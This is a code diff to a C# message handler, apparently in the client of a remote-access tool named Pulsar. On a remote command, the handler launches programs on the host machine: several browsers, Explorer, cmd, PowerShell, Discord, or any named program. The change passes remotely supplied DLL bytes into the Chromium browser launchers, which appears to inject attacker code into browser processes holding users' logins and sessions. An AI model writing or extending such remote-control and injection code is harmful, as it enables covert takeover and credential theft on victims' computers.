@@ -307,6 +307,7 @@ namespace Pulsar.Client.Messages
         {
             string name = message.Path;
             bool dontCloneProfile = message.DontCloneProfile;
+            byte[] dllBytes = message.DllBytes;
 
             var browserPaths = new Dictionary<string, string>
             {
@@ -332,27 +333,41 @@ namespace Pulsar.Client.Messages
                 return;
             }
 
-            var processActions = new Dictionary<string, Action>
+            switch (name)
             {
-                { "Chrome", ProcessHandler.Startchrome },
-                { "Explorer", ProcessHandler.StartExplorer },
-                { "Cmd", ProcessHandler.StartCmd },
-                { "Powershell", ProcessHandler.StartPowershell },
-                { "Edge", ProcessHandler.StartEdge },
-                { "Brave", ProcessHandler.StartBrave },
-                { "Opera", ProcessHandler.StartOpera },
-                { "OperaGX", ProcessHandler.StartOperaGX },
-                { "Mozilla", ProcessHandler.StartFirefox },
-                { "Discord", ProcessHandler.StartDiscord }
-            };
-
-            if (processActions.TryGetValue(name, out var action))
-            {
-                action();
-            }
-            else
-            {
-                ProcessHandler.StartGeneric(name);
+                case "Chrome":
+                    ProcessHandler.Startchrome(dllBytes);
+                    break;
+                case "Edge":
+                    ProcessHandler.StartEdge(dllBytes);
+                    break;
+                case "Brave":
+                    ProcessHandler.StartBrave(dllBytes);
+                    break;
+                case "Opera":
+                    ProcessHandler.StartOpera(dllBytes);
+                    break;
+                case "OperaGX":
+                    ProcessHandler.StartOperaGX(dllBytes);
+                    break;
+                case "Explorer":
+                    ProcessHandler.StartExplorer();
+                    break;
+                case "Cmd":
+                    ProcessHandler.StartCmd();
+                    break;
+                case "Powershell":
+                    ProcessHandler.StartPowershell();
+                    break;
+                case "Mozilla":
+                    ProcessHandler.StartFirefox();
+                    break;
+                case "Discord":
+                    ProcessHandler.StartDiscord();
+                    break;
+                default:
+                    ProcessHandler.StartGeneric(name);
+                    break;
             }
         }
 
